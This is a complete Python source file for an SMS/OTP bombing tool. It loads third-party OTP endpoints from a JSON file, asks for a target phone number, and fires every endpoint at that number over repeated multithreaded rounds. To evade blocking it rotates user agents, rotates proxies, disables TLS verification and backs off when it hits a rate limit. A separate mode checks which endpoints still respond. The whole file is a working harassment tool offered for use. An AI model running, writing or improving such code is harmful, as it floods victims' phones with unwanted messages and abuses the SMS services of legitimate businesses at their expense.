# -*- coding: utf-8 -*-
"""
SPAM SMS / OTP TOOL — main.py
=============================
Single-file tool consolidating every API from the legacy versions
(spam.py, spam (1).py, sms_bomber v1.py, smsvip.py). Data lives under data/:

  data/input/apis.json        - all API definitions (add an API by editing this file, no code changes)
  data/input/proxies.txt      - proxies (optional, one per line)
  data/output/live_apis.json  - live APIs produced by Check mode; Spam mode prefers this list

Interface: Clean Minimalist Typography (pure ANSI, no box-drawing, zero-flicker).

Modes:
  1. Spam      - enter a phone number -> fire all APIs (prefers data/output/live_apis.json)
  2. Check API - scan which endpoints are still alive (uses DUMMY numbers, sends NO real SMS)
  3. Exit

Direct CLI (no menu):
  python main.py check [vn|in|all] [--proxy]                       -> scan live APIs
  python main.py spam <phone> [rounds] [vn|in|all] [--proxy]       -> spam directly
  (rounds and market are order-independent: spam <phone> in 3 == spam <phone> 3 in)
"""
import os
import sys
import json
import time
import random
import queue
import threading
import atexit
from collections import deque

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

# Enable ANSI escapes on Windows consoles (Win10+); harmless elsewhere
if os.name == "nt":
    os.system("")

# Silence urllib3 SSL warnings (verify=False) so they do not corrupt the TUI
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Guarantee the terminal cursor is restored on ANY exit path (incl. SIGTERM)
# Literal escape string: safe even if the module partially failed to load
atexit.register(lambda: sys.stdout.write("\033[?25h\n"))

# === TOOL IDENTITY ===
TOOL_NAME = "SPAM SMS / OTP TOOL"
VERSION = "v2.0.0"

# === CONFIGURATION ===
DATA_DIR = "data"
CONFIG_FILE = os.path.join(DATA_DIR, "input", "apis.json")
LIVE_FILE = os.path.join(DATA_DIR, "output", "live_apis.json")
PROXY_FILE = os.path.join(DATA_DIR, "input", "proxies.txt")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
]

MARKETS = {"vn": "Vietnam", "in": "India", "all": "All"}
PHONE_FMTS = ("raw", "vn84", "vn84plus", "plus91", "91dash")

# === ANSI COLOR PALETTE (NO_COLOR aware) ===
_NO_COLOR = os.environ.get("NO_COLOR", "") != ""
BW = "" if _NO_COLOR else "\033[1;97m"  # Bold White  - primary values
CY = "" if _NO_COLOR else "\033[1;96m"  # Cyan        - labels
GR = "" if _NO_COLOR else "\033[1;92m"  # Green       - positive / live
YE = "" if _NO_COLOR else "\033[1;93m"  # Yellow      - warnings / cooldown
RD = "" if _NO_COLOR else "\033[1;91m"  # Red         - errors / dead
DG = "" if _NO_COLOR else "\033[90m"    # Dim Gray    - timestamps / secondary
RS = "" if _NO_COLOR else "\033[0m"     # Reset

EL = "\033[K"     # erase rest of line
GOTO_TOP = "\033[H"  # move to top-left
CLEAR_EOS = "\033[J" # clear below the cursor
HIDE_CURSOR = "\033[?25l"
SHOW_CURSOR = "\033[?25h"


# === TERMINAL UI: CLEAN MINIMALIST TYPOGRAPHY (zero-flicker, crash-proof) ===
class TerminalUI:
    """
    Renders the whole interface from a single buffer string, written once.
    Vertical 4-block layout, each block separated by exactly one blank line:
      1) Header & Status      2) Core Identity      3) Live Metrics      4) Recent Activity
    Every state access goes through .get() with a fallback and render is
    wrapped in try/except so a UI error can never crash the main loop.
    """

    def __init__(self):
        self.start_time = time.time()
        self.logs = deque(maxlen=5)
        self._cursor_hidden = False
        self._lock = threading.Lock()

    # -- cursor management --
    def start(self):
        if not self._cursor_hidden:
            sys.stdout.write(HIDE_CURSOR)
            sys.stdout.flush()
            self._cursor_hidden = True

    def stop(self):
        if self._cursor_hidden:
            sys.stdout.write(SHOW_CURSOR + "\n")
            sys.stdout.flush()
            self._cursor_hidden = False

    # -- activity log --
    def add_log(self, level, name, detail):
        ts = time.strftime("%H:%M:%S")
        if level == "ok":
            icon = f"{GR}✔{RS}"
        elif level == "warn":
            icon = f"{YE}!{RS}"
        else:
            icon = f"{RD}✘{RS}"
        with self._lock:
            self.logs.append((ts, icon, str(name)[:20], str(detail)[:34]))

    # -- safe render helpers --
    def _uptime(self):
        elapsed = int(time.time() - self.start_time)
        h, rem = divmod(elapsed, 3600)
        m, s = divmod(rem, 60)
        return f"{h:02d}:{m:02d}:{s:02d}", elapsed

    def _status(self, raw):
        if raw == "COOLDOWN":
            return f"{YE}● COOLDOWN{RS}"
        if raw == "STOPPED":
            return f"{RD}● STOPPED{RS}"
        return f"{GR}● RUNNING{RS}"

    @staticmethod
    def _kv(label, value):
        return f"{CY}{label.ljust(20)}{RS}: {BW}{value}{RS}{EL}"

    def _metrics(self, state, elapsed):
        rows = []
        if state.get("mode") == "check":
            scanned = state.get("scanned", 0)
            live = state.get("live", 0)
            dead = state.get("dead", 0)
            rate = live / scanned * 100 if scanned else 0.0
            rows.append(self._kv("Scanned", f"{scanned:,}"))
            rows.append(f"{CY}{'Live'.ljust(20)}{RS}: {GR}{live:,}{RS}{EL}")
            rows.append(f"{CY}{'Dead'.ljust(20)}{RS}: {RD}{dead:,}{RS}{EL}")
            rows.append(self._kv("Success Rate", f"{rate:.1f}%"))
            rows.append(self._kv("Throughput", f"{(scanned / elapsed if elapsed else 0.0):.1f} scans/s"))
        else:
            total_req = state.get("total_req", 0)
            success_cnt = state.get("success_count", 0)
            failed_cnt = state.get("failed_count", 0)
            throttled = state.get("throttled_count", 0)
            rate = success_cnt / total_req * 100 if total_req else 0.0
            rows.append(self._kv("Requests Sent", f"{total_req:,}"))
            rows.append(f"{CY}{'Successful Live'.ljust(20)}{RS}: {GR}{success_cnt:,}{RS}{EL}")
            rows.append(f"{CY}{'Failed / Dead'.ljust(20)}{RS}: {RD}{failed_cnt:,}{RS}{EL}")
            rows.append(f"{CY}{'Throttled (429)'.ljust(20)}{RS}: {YE}{throttled:,}{RS}{EL}")
            rows.append(self._kv("Success Rate", f"{rate:.1f}%"))
            rows.append(self._kv("Throughput", f"{(total_req / elapsed if elapsed else 0.0):.1f} req/s"))
        return rows

    # -- full screen render --
    def render(self, state):
        try:
            uptime, elapsed = self._uptime()
            mode = state.get("mode", "spam")
            lines = []

            # Block 1: Header & Status
            lines.append(
                f"{BW}{TOOL_NAME}{RS}  {DG}{VERSION}{RS}  {self._status(state.get('status', 'RUNNING'))}"
                f"  {DG}{uptime}{RS}{EL}"
            )
            lines.append(EL)

            # Block 2: Core Identity
            lines.append(self._kv("Market", state.get("market_name", "Vietnam")))
            lines.append(self._kv("Engine", f"{state.get('threads', 0)} Threads | Proxy: {state.get('proxy_info', 'Disabled')}"))
            if mode == "check":
                lines.append(self._kv("Mode", "Check API"))
                lines.append(self._kv("Dummy", state.get("target", "N/A")))
                lines.append(self._kv("Progress", state.get("round_info", "0 / 0")))
            else:
                lines.append(self._kv("Target", state.get("target", "N/A")))
                lines.append(self._kv("Round", state.get("round_info", "1 / 1")))
            lines.append(EL)

            # Block 3: Live Metrics
            lines.extend(self._metrics(state, elapsed))
            lines.append(EL)

            # Block 4: Recent Activity
            if self.logs:
                for ts, icon, name, detail in list(self.logs):
                    lines.append(f"{DG}[{ts}]{RS}  {icon} {BW}{name.ljust(22)}{RS} {DG}{detail}{RS}{EL}")
            else:
                lines.append(f"{DG}  Waiting for first dispatch...{RS}{EL}")
            lines.append(f"{DG}[Ctrl+C to stop]{RS}{EL}")

            with self._lock:
                sys.stdout.write(GOTO_TOP + "\n".join(lines) + CLEAR_EOS)
                sys.stdout.flush()
        except Exception:
            # Absolute fallback: a UI error must never crash the main loop
            pass


# === CONFIG LOADER & VALIDATION ===
def load_config(path=CONFIG_FILE):
    """Load apis.json; on error, report the file + line clearly and exit."""
    if not os.path.exists(path):
        print(f"{RD}[!] Config file not found: {path}{RS}")
        sys.exit(1)
    try:
        with open(path, encoding="utf-8") as f:
            cfg = json.load(f)
    except json.JSONDecodeError as e:
        print(f"{RD}[!] Invalid JSON in {path} (line {e.lineno}): {e.msg}{RS}")
        sys.exit(1)

    defaults = cfg.get("defaults", {})
    defaults.setdefault("timeout", 8)
    defaults.setdefault("max_threads", 20)
    defaults.setdefault("cooldown_429", 120)
    defaults.setdefault("cooldown_4xx", 60)

    apis = cfg.get("apis", [])
    seen = set()
    for api in apis:
        name = api.get("name")
        if not name or name in seen:
            print(f"{RD}[!] apis.json: API missing 'name' or duplicate name: {name}{RS}")
            sys.exit(1)
        seen.add(name)
        if api.get("method", "POST").upper() not in ("GET", "POST", "PUT"):
            print(f"{RD}[!] apis.json: invalid method for '{name}': {api.get('method')}{RS}")
            sys.exit(1)
        if api.get("phone_fmt", "raw") not in PHONE_FMTS:
            print(f"{RD}[!] apis.json: invalid phone_fmt for '{name}': {api.get('phone_fmt')}{RS}")
            sys.exit(1)
        api.setdefault("enabled", True)
        api.setdefault("market", "vn")
        api.setdefault("method", "POST")
    return cfg


# === PHONE FORMATTING & TEMPLATE RENDERING ===
def format_phone(phone, fmt="raw"):
    """Normalize a phone number to the format required by each API."""
    digits = "".join(ch for ch in str(phone) if ch.isdigit())
    if fmt == "vn84":
        return ("84" + digits[1:]) if digits.startswith("0") else digits
    if fmt == "vn84plus":
        return ("+84" + digits[1:]) if digits.startswith("0") else digits
    if fmt == "plus91":
        return "+91" + digits[-10:]
    if fmt == "91dash":
        return "91-" + digits[-10:]
    return str(phone)  # raw


def render(value, phone):
    """Replace {phone} inside str/dict/list (recursive)."""
    if isinstance(value, str):
        return value.replace("{phone}", phone)
    if isinstance(value, dict):
        return {k: render(v, phone) for k, v in value.items()}
    if isinstance(value, list):
        return [render(v, phone) for v in value]
    return value


# === PROXY POOL (round-robin, thread-safe) ===
class ProxyPool:
    def __init__(self, path=PROXY_FILE):
        self.items = []
        self.idx = 0
        self.lock = threading.Lock()
        if os.path.exists(path):
            with open(path, encoding="utf-8") as f:
                self.items = [ln.strip() for ln in f if ln.strip()]
        self.enabled = False

    def next(self):
        if not self.enabled or not self.items:
            return {}
        with self.lock:
            p = self.items[self.idx % len(self.items)]
            self.idx += 1
        # Keep an explicit scheme (http://, socks5://, ...) as-is; default to http://
        p = p if "://" in p else "http://" + p
        return {"http": p, "https": p}

    def count(self):
        return len(self.items)


# === RATE-LIMIT COOLDOWN (429 backoff) ===
class Cooldown:
    def __init__(self, cfg):
        self.cd429 = cfg["defaults"]["cooldown_429"]
        self.cd4xx = cfg["defaults"]["cooldown_4xx"]
        self.map = {}
        self.lock = threading.Lock()

    def hit(self, url, status):
        delay = self.cd429 if status == 429 else (self.cd4xx if 400 <= status < 500 else 15)
        with self.lock:
            self.map[url] = time.time() + delay

    def is_cooling(self, url):
        with self.lock:
            return self.map.get(url, 0) > time.time()


# === REQUEST DISPATCH ===
def build_session():
    s = requests.Session()
    retry = Retry(
        total=1, backoff_factor=0.3,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["GET", "POST", "PUT"],
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s


def _run_bounded(work, items, max_workers, budget):
    """
    Run work(item) for every item using daemon threads + a queue.
    After the budget (seconds), the main thread stops waiting — stuck
    threads are DAEMON so the process exits cleanly and the UI never
    hangs because of a single dead API.
    Returns the number of items actually processed.
    """
    if not items:
        return 0
    q = queue.Queue()
    for item in items:
        q.put(item)
    done_count = 0
    lock = threading.Lock()

    def worker():
        nonlocal done_count
        while True:
            try:
                item = q.get_nowait()
            except queue.Empty:
                return
            try:
                work(item)
            except Exception:
                pass
            with lock:
                done_count += 1

    n = min(max_workers, len(items))
    threads = [threading.Thread(target=worker, daemon=True) for _ in range(n)]
    for t in threads:
        t.start()

    deadline = time.time() + budget
    while time.time() < deadline:
        # Early exit: everything processed (queue empty + all items done)
        with lock:
            if q.empty() and done_count >= len(items):
                break
        # 200ms polling keeps Ctrl+C and cooldown countdown responsive
        if not any(t.is_alive() for t in threads):
            break
        time.sleep(0.2)
    with lock:
        return done_count


def send_one(api, phone, session, proxy, timeout):
    """Send a single request. Returns (name, is_live, status_code, elapsed, err)."""
    name = api.get("name", "?")
    method = api.get("method", "POST").upper()
    url = render(api.get("url", ""), phone)
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
    }
    headers.update(render(api.get("headers") or {}, phone))

    kwargs = {"headers": headers, "timeout": (min(6, timeout), timeout),
              "verify": False, "proxies": proxy}
    if "params" in api:
        kwargs["params"] = render(api["params"], phone)
    if "json" in api:
        kwargs["json"] = render(api["json"], phone)
    if "form" in api:
        kwargs["data"] = render(api["form"], phone)

    t0 = time.time()
    try:
        r = session.request(method, url, **kwargs)
        # live = the server responded (200-499); 5xx/timeout/SSL = dead
        return name, 200 <= r.status_code < 500, r.status_code, time.time() - t0, None
    except Exception as e:
        return name, False, None, time.time() - t0, str(e)[:80]


# === API HEALTH CHECK MODE (dummy numbers — sends NO real SMS) ===
def check_apis(market, cfg, proxies):
    defaults = cfg.get("defaults", {})
    dummy = cfg.get("dummy_phones", {"vn": "0912345678", "in": "9876543210"})
    apis = [a for a in cfg.get("apis", []) if a.get("enabled", True)
            and (market == "all" or a.get("market") == market)]
    if not apis:
        print(f"{YE}[!] No APIs found for market: {market}{RS}")
        return

    ui = TerminalUI()
    ui.start()
    try:
        state = {
            "mode": "check",
            "status": "RUNNING",
            "market_name": MARKETS.get(market, market),
            "target": "dummy",   # check mode: no real SMS is sent
            "threads": defaults.get("max_threads", 20),
            "proxy_info": f"{proxies.count()} active" if proxies.enabled else "Disabled",
            "round_info": f"0 / {len(apis)}",
            "scanned": 0, "live": 0, "dead": 0,
        }
        lock = threading.Lock()
        live_names = set()
        session = build_session()

        def work(api):
            phone = format_phone(dummy.get(api.get("market", "vn"), "0912345678"), api.get("phone_fmt", "raw"))
            name, live, code, _el, err = send_one(api, phone, session, proxies.next(), defaults.get("timeout", 8))
            with lock:
                state["scanned"] += 1
                state["round_info"] = f"{state['scanned']} / {len(apis)}"
                if live:
                    state["live"] += 1
                    live_names.add(name)
                    ui.add_log("ok", name, f"{code} OK")
                else:
                    state["dead"] += 1
                    ui.add_log("fail", name, err or f"{code}")
                ui.render(state)

        ui.render(state)
        budget = 60  # hard cap for the whole scan, in seconds
        processed = _run_bounded(work, apis, defaults.get("max_threads", 20), budget)
    finally:
        ui.stop()
        session.close()

    # Post-run summary (scrollback, no box-drawing)
    live = state["live"]
    dead = state["dead"]
    print(f"{GR}✔  Live: {live}{RS}")
    print(f"{RD}✘  Dead: {dead}{RS}")
    print(f"{DG}  Total scanned: {live + dead}{RS}")
    if processed < len(apis):
        print(f"{YE}!  Budget expired ({budget}s): skipped {len(apis) - processed} slow APIs{RS}")

    # Save the live list for Spam mode
    os.makedirs(os.path.dirname(LIVE_FILE), exist_ok=True)
    live_cfg = [a for a in cfg.get("apis", []) if a.get("name") in live_names]
    with open(LIVE_FILE, "w", encoding="utf-8") as f:
        json.dump({"market": market, "count": len(live_cfg), "apis": live_cfg}, f, ensure_ascii=False, indent=2)
    print(f"{GR}✔  Saved {len(live_cfg)} live APIs to {LIVE_FILE}{RS}")


# === SPAM MODE ===
def get_spam_apis(market, cfg):
    """Prefer live_apis.json only when it covers the requested market; otherwise fall back to apis.json."""
    if os.path.exists(LIVE_FILE):
        try:
            with open(LIVE_FILE, encoding="utf-8") as f:
                live_cfg = json.load(f)
            # The live list is only trustworthy if it was built for this exact market
            live_market = live_cfg.get("market", "all")
            if live_market not in ("all", market):
                raise ValueError("live list is for '{}', not '{}'".format(live_market, market))
            apis = [a for a in live_cfg.get("apis", []) if a.get("enabled", True)
                    and (market == "all" or a.get("market") == market)]
            if apis:
                return apis
        except Exception:
            pass
    return [a for a in cfg.get("apis", []) if a.get("enabled", True)
            and (market == "all" or a.get("market") == market)]


def spam_round(apis, phone, cfg, proxies, cooldown, session, ui, state, round_no, rounds):
    """Fire one round against every API (skipping cooled-down ones), rendering the TUI live."""
    defaults = cfg.get("defaults", {})
    lock = threading.Lock()

    def work(api):
        if cooldown.is_cooling(api.get("url", "")):
            return
        fmt = api.get("phone_fmt", "raw")
        p = format_phone(phone, fmt)
        name, live, code, _el, err = send_one(api, p, session, proxies.next(), defaults.get("timeout", 8))
        with lock:
            state["total_req"] += 1
            if live:
                state["success_count"] += 1
                ui.add_log("ok", name, f"{code} OK")
            else:
                state["failed_count"] += 1
                ui.add_log("fail", name, err or f"{code}")
            if code == 429:
                state["throttled_count"] += 1
                ui.add_log("warn", name, f"429 Throttled (Cooldown {cooldown.cd429}s)")
            if code and code >= 400:
                cooldown.hit(api.get("url", ""), code)
            ui.render(state)

    budget = 45  # hard cap per spam round, in seconds
    processed = _run_bounded(work, apis, defaults.get("max_threads", 20), budget)
    if processed < len(apis):
        with lock:
            ui.add_log("warn", "budget", f"{budget}s: skipped {len(apis) - processed} slow APIs")

    with lock:
        state["round_info"] = f"{round_no} / {rounds}"
        ui.render(state)


def spam(phone, rounds, market, cfg, proxies):
    defaults = cfg.get("defaults", {})
    cooldown = Cooldown(cfg)
    session = build_session()
    apis = get_spam_apis(market, cfg)

    if not apis:
        print(f"{RD}[!] No APIs found for market: {market}. Run 'python main.py check' first.{RS}")
        return

    ui = TerminalUI()
    ui.start()
    try:
        state = {
            "mode": "spam",
            "status": "RUNNING",
            "target": phone,
            "market_name": MARKETS.get(market, market),
            "threads": defaults.get("max_threads", 20),
            "proxy_info": f"{proxies.count()} active" if proxies.enabled else "Disabled",
            "round_info": f"1 / {rounds}",
            "total_req": 0, "success_count": 0, "failed_count": 0, "throttled_count": 0,
        }
        ui.render(state)

        for i in range(1, rounds + 1):
            spam_round(apis, phone, cfg, proxies, cooldown, session, ui, state, i, rounds)
            if i < rounds:
                # Countdown delay between rounds, TUI keeps rendering (cooldown status)
                state["status"] = "COOLDOWN"
                for j in range(int(defaults.get("delay", 2)), 0, -1):
                    state["round_info"] = f"delay {j}s -> round {i + 1}"
                    ui.render(state)
                    time.sleep(1)
                state["status"] = "RUNNING"
    finally:
        ui.stop()

    # Final summary (scrollback, no box-drawing)
    n = state["success_count"] + state["failed_count"]
    rate = state["success_count"] / n * 100 if n else 0.0
    print(f"{GR}✔  Successful: {state['success_count']:,}{RS}")
    print(f"{RD}✘  Failed    : {state['failed_count']:,}{RS}")
    print(f"{YE}!  Throttled : {state['throttled_count']:,}{RS}")
    print(f"{DG}   Success Rate: {rate:.1f}%{RS}")
    session.close()


# === INTERACTIVE MENU & CLI ===
def banner(count):
    return (
        f"{BW}{TOOL_NAME}{RS}  {DG}{VERSION}{RS}\n"
        f"{DG}{count} API loaded{RS}\n"
        f"\n"
        f"{CY}> 1.{RS} Spam\n"
        f"{CY}> 2.{RS} Check API\n"
        f"{CY}> 3.{RS} Exit\n"
    )


def _read(prompt):
    """Safe input(): EOF (closed stdin) exits cleanly, Ctrl+C propagates."""
    try:
        return input(prompt)
    except EOFError:
        sys.exit(0)


def ask_choice(prompt, options):
    while True:
        v = _read(prompt).strip("\ufeff").strip().lower()
        if v in options:
            return v
        print(f"{RD}[!] Invalid choice{RS}")


def ask_phone():
    while True:
        p = _read(f"{CY}›{RS} Enter target phone number (e.g. 0918123456): ").strip("\ufeff").strip()
        digits = "".join(c for c in p if c.isdigit())
        if len(digits) >= 9:
            # Sanitize: keep digits (+ leading '+' for international numbers)
            return ("+" + digits) if p.startswith("+") else digits
        print(f"{RD}[!] Invalid phone number{RS}")


def ask_market():
    print(f"\n{CY}Select market:{RS}")
    print(f"  {CY}> 1.{RS} Vietnam")
    print(f"  {CY}> 2.{RS} India")
    print(f"  {CY}> 3.{RS} All")
    v = ask_choice("Select (1-3): ", ("1", "2", "3"))
    return {"1": "vn", "2": "in", "3": "all"}[v]


def ask_int(prompt, default, min_val=1):
    while True:
        v = _read(prompt).strip("\ufeff").strip()
        if not v:
            return default
        try:
            n = int(v)
            if n >= min_val:
                return n
        except ValueError:
            pass
        print(f"{RD}[!] Please enter a valid integer (min {min_val}){RS}")


def main():
    sys.stdout.write("\033[2J\033[H")  # pure-ANSI clear screen, no os.system
    sys.stdout.flush()
    cfg = load_config()
    proxies = ProxyPool()

    # --- Direct CLI (parsed BEFORE any interactive prompt) ---
    args = sys.argv[1:]
    if args and args[0] == "check":
        market = args[1] if len(args) > 1 and args[1] in MARKETS else "vn"
        if proxies.count():
            proxies.enabled = "--proxy" in args
        check_apis(market, cfg, proxies)
        return
    if args and args[0] == "spam":
        if len(args) < 2:
            print(f"{RD}[!] Missing phone number. Usage: python main.py spam <phone> [rounds] [vn|in|all]{RS}")
            return
        # Flexible parsing: spam <phone> <market>  OR  spam <phone> <rounds> <market>
        market = "vn"
        rounds = 1
        for tok in args[2:]:  # skip command + phone number
            if tok in MARKETS:
                market = tok
            elif tok.isdigit():
                rounds = int(tok)
        if proxies.count():
            proxies.enabled = "--proxy" in args
        # Sanitize CLI phone the same way ask_phone() does: digits + optional leading '+'
        raw_phone = args[1].strip()
        digits = "".join(c for c in raw_phone if c.isdigit())
        if len(digits) < 9:
            print(f"{RD}[!] Invalid phone number. Usage: python main.py spam <phone> [rounds] [vn|in|all]{RS}")
            return
        phone = ("+" + digits) if raw_phone.startswith("+") else digits
        spam(phone, rounds, market, cfg, proxies)
        return

    # --- Interactive menu (only now ask about proxies) ---
    if proxies.count():
        v = _read(f"{CY}›{RS} Found {proxies.count()} proxies in {PROXY_FILE}. Enable proxy rotation? (y/n): ").strip("\ufeff").strip().lower()
        proxies.enabled = v == "y"

    print(banner(len(cfg.get("apis", []))))
    while True:
        v = ask_choice(f"\n{CY}›{RS} Select option (1/2/3): ", ("1", "2", "3", "q"))
        # Early exit (guard clause)
        if v in ("3", "q"):
            print(f"\n{GR}👋 Goodbye!{RS}")
            break
        try:
            if v == "1":
                phone = ask_phone()
                market = ask_market()
                rounds = ask_int("Number of spam rounds (default 1): ", 1)
                spam(phone, rounds, market, cfg, proxies)
            else:  # v == "2"
                market = ask_market()
                check_apis(market, cfg, proxies)
        except KeyboardInterrupt:
            print(f"\n{YE}[!] Interrupted.{RS}")
        except Exception as e:
            print(f"{RD}[!] Error: {e}{RS}")


if __name__ == "__main__":
    main()
